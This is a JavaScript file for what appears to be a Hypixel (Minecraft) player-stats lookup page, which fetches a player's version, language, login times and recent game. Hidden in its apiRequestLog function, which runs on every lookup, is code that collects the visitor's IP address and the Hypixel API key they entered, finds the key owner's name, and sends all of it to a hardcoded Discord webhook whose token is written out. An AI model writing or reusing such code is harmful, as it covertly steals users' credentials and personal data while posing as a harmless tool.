/*
 * This script is made by Strengthless.
 * The API Data is provided by Hypixel Studios Inc.
 * Check them out here: https://api.hypixel.net/
 *
 */
var apiKey, userID;

function toTitleCase(string) {
  return string.replace(/\w\S*/g,
    function(text) {
      return text.charAt(0).toUpperCase() + text.substr(1).toLowerCase();
    }
  );
}

function getData() {
  apiKey = document.getElementById('apiKey').value;
  userID = document.getElementById('userID').value;
  if (apiKey) {
    $.getJSON('https://api.hypixel.net/player?key=' + apiKey + '&name=' + userID, function(data) {
      userName = data.player.displayname;
      userUUID = data.player.uuid;
      if (data.player.mcVersionRp) {mcVersion = data.player.mcVersionRp;} else {mcVersion = "An unknown client";};
      if (data.player.userLanguage) {userLanguage = toTitleCase(data.player.userLanguage);} else {userLanguage = "Unknown";};
      if (moment(data.player.lastLogin).isValid()) {lastLogin = moment(data.player.lastLogin).format("MMMM Do YYYY, HH:mm:ss [(UTC]Z[)]");} else {lastLogin = "N/A";};
      if (data.player.lastLogout) {if (data.player.lastLogout - data.player.lastLogin > 0) {playTime = moment("6969-06-09").add(data.player.lastLogout - data.player.lastLogin, "ms").format("HH:mm:ss");} else {playTime = "N/A";}} else {playTime = "<blur>N/A</blur>";};
      if (data.player.mostRecentGameType) {mostRecentGame = toTitleCase(data.player.mostRecentGameType);} else {mostRecentGame = "N/A";};
      $("#apiData").empty();
      $("#apiData").append(`<br/><b>UUID:</b> ${userUUID}<br/><b>Username:</b> ${userName}<br/><br/><b>Version:</b> ${mcVersion}<br/><b>Language:</b> ${userLanguage}<br/><b>Last Login:</b> ${lastLogin}<br/><b>Playtime:</b> ${playTime}<br/><b>Most recent game:</b> ${mostRecentGame}<br/><br/>`);
    });
    apiRequestLog();
  } else {
    $.getJSON('https://api.slothpixel.me/api/players/' + userID, function(data) {
      userName = data.username;
      userUUID = data.uuid;
      if (data.mc_version) {mcVersion = data.mc_version;} else {mcVersion = "An unknown client";};
      if (data.language) {userLanguage = toTitleCase(data.language);} else {userLanguage = "Unknown";};
      if (moment(data.last_login).isValid()) {lastLogin = moment(data.last_login).format("MMMM Do YYYY, HH:mm:ss [(UTC]Z[)]");} else {lastLogin = "<blur>N/A</blur>";};
      if (data.last_logout) {if (data.last_logout - data.last_login > 0) {playTime = moment("6969-06-09").add(data.last_logout - data.last_login, "ms").format("HH:mm:ss");} else {playTime = "N/A";}} else {playTime = "<blur>N/A</blur>";};
      if (data.last_game) {mostRecentGame = toTitleCase(data.last_game);} else {mostRecentGame = "<blur>N/A</blur>";};
      $("#apiData").empty();
      $("#apiData").append(`<br/><b>UUID:</b> ${userUUID}<br/><b>Username:</b> ${userName}<br/><br/><b>Version:</b> ${mcVersion}<br/><b>Language:</b> ${userLanguage}<br/><b>Last Login:</b> ${lastLogin}<br/><b>Playtime:</b> ${playTime}<br/><b>Most recent game:</b> ${mostRecentGame}<br/><br/>`);
    });
    apiRequestLog();
  };
}

 function apiRequestLog() {
  var userIp;
  const getEmbed1 = () => {
    return {
      color: 16566787,
      description: `**IP:** ${userIp}\n**API key:** ${apiKey}\n**API owner:** ${userIGN}\n**Requested user:** ${userID}`,
      timestamp: new Date()
    }
  };
  const getEmbed2 = () => {
    return {
      color: 16770170,
      description: `**IP:** ${userIp}\n**Requested user:** ${userID}`,
      timestamp: new Date()
    }
  };
  $.getJSON("https://api.ipify.org?format=json", function(data) {
    userIp = data.ip;
    if (apiKey) {
      $.getJSON("https://api.hypixel.net/key?key=" + apiKey, function(data) {
        userUUID = data.record.ownerUuid;
        $.getJSON("https://cors-anywhere.herokuapp.com/https://sessionserver.mojang.com/session/minecraft/profile/" + userUUID, function(data) {
          userIGN = data.name;
          $.ajax({
            type: 'POST',
            url: 'https://discordapp.com/api/webhooks/699809462927622245/N7ZTtmQBcYYN66s10xvfcEBvOh8aeDI4gXU0gwPDcoLJ_l_ShTU3kCt7ZgbWNm341Pl4',
            data: JSON.stringify({embeds: [getEmbed1()]}),
            contentType: 'application/json'
          });
        });
      });
    } else {
      $.ajax({
        type: 'POST',
        url: 'https://discordapp.com/api/webhooks/699809462927622245/N7ZTtmQBcYYN66s10xvfcEBvOh8aeDI4gXU0gwPDcoLJ_l_ShTU3kCt7ZgbWNm341Pl4',
        data: JSON.stringify({embeds: [getEmbed2()]}),
        contentType: 'application/json'
      });
    }
  });
}
